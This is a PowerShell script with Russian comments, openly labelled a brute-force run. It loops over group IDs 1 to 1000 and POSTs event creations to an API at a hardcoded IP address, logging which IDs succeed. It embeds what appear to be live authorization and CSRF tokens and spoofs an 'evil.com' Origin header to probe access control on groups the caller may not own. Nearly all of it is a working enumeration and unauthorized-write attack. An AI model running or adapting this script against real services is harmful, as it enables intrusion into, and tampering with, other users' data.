Write-Host "🚀 Запуск брутфорса групп (1-1000) с использованием System.Net.HttpWebRequest..." -ForegroundColor Red

$createdEvents = @()
$token = "e1696c58c1fc6fdbdedd027887a6920c280cd45e"
$csrfToken = "4wG9bkx8p4vMY5qMgtPu9BBp1nhrPYDH5BLGM0sY9HTchbWXbHFms1xiHiQr1bli"

# Увеличиваем лимит на количество одновременных подключений
[System.Net.ServicePointManager]::DefaultConnectionLimit = 1000

for ($i = 1; $i -le 1000; $i++) {
    # Данные для создания события ДЛЯ ГРУППЫ
    $eventData = @{
        name = "trainingday"
        component = 1
        starts = "2025-11-19T11:30:00Z"
        finishes = "2025-11-19T13:05:00Z"
        interval = 6000
        for_group = $true
        blocks_next = $true
        group = $i  # ← Перебираем ID от 1 до 1000
        meta = @{
            knowledge_base = 2
            confirm_avidence = $false
            conflict_resolving = 2
            inference_direction = 2
            goal_selecting = 2
        }
    }
    
    $jsonData = $eventData | ConvertTo-Json -Depth 5 -Compress
    $url = "http://185.17.141.230:8080/api/events/"

    try {
        # Создаем HTTP запрос через System.Net.HttpWebRequest
        $request = [System.Net.HttpWebRequest]::Create($url)
        $request.Method = "POST"
        $request.ContentType = "application/json"
        $request.Headers.Add("Authorization", "Token $token")
        $request.Headers.Add("X-CSRFToken", $csrfToken)
        $request.Headers.Add("Cookie", "csrftoken=$csrfToken")
        $request.Headers.Add("Origin", "https://evil.com")
        $request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        $request.Timeout = 10000  # 10 секунд таймаут
        $request.KeepAlive = $false
        
        # Пишем данные в поток
        $requestStream = $request.GetRequestStream()
        $writer = New-Object System.IO.StreamWriter($requestStream)
        $writer.Write($jsonData)
        $writer.Flush()
        $writer.Close()
        $requestStream.Close()
        
        # Получаем ответ
        $response = $request.GetResponse()
        $reader = New-Object System.IO.StreamReader($response.GetResponseStream())
        $content = $reader.ReadToEnd()
        $reader.Close()
        $response.Close()
        
        # Парсим JSON ответ
        $createdEvent = $content | ConvertFrom-Json
        
        Write-Host "✅ УСПЕХ! Создано событие для группы ID $i" -ForegroundColor Green
        Write-Host "   ID события: $($createdEvent.id)" -ForegroundColor Cyan
        
        $createdEvents += [PSCustomObject]@{
            GroupID = $i
            EventID = $createdEvent.id
            EventName = $createdEvent.name
        }
        
        # Пауза чтобы не перегружать сервер
        Start-Sleep -Milliseconds 50
        
    }
    catch [System.Net.WebException] {
        # Обработка ошибок HTTP
        if ($_.Exception.Response) {
            $statusCode = [int]$_.Exception.Response.StatusCode
            if ($statusCode -eq 400 -or $statusCode -eq 403 -or $statusCode -eq 404) {
                # Ожидаемые ошибки для несуществующих групп
                if ($i % 50 -eq 0) {
                    Write-Host "⚠️  ID $i - ошибка $statusCode (нормально)" -ForegroundColor Yellow
                }
            } else {
                Write-Host "❌ ID $i - HTTP ошибка: $statusCode" -ForegroundColor Red
            }
        } else {
            Write-Host "❌ ID $i - ошибка: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
    catch {
        # Другие ошибки
        if ($i % 50 -eq 0) {
            Write-Host "⚠️  ID $i - ошибка (нормально)" -ForegroundColor Yellow
        }
    }
}

# Результаты
Write-Host "`n" + "="*60 -ForegroundColor Green
Write-Host "📊 РЕЗУЛЬТАТЫ БРУТФОРСА:" -ForegroundColor Green
Write-Host "="*60 -ForegroundColor Green

if ($createdEvents.Count -gt 0) {
    Write-Host "✅ Успешно созданы события для групп:" -ForegroundColor Green
    $createdEvents | Format-Table GroupID, EventID, EventName -AutoSize
    
    Write-Host "🎯 Найдено рабочих ID групп: $($createdEvents.Count)" -ForegroundColor Cyan
    
    # Сохраняем результаты в файл
    $createdEvents | Export-Csv -Path "bruteforce_results.csv" -NoTypeInformation -Encoding UTF8
    Write-Host "💾 Результаты сохранены в bruteforce_results.csv" -ForegroundColor Green
} else {
    Write-Host "❌ Не найдено рабочих ID групп в диапазоне 1-1000" -ForegroundColor Red
}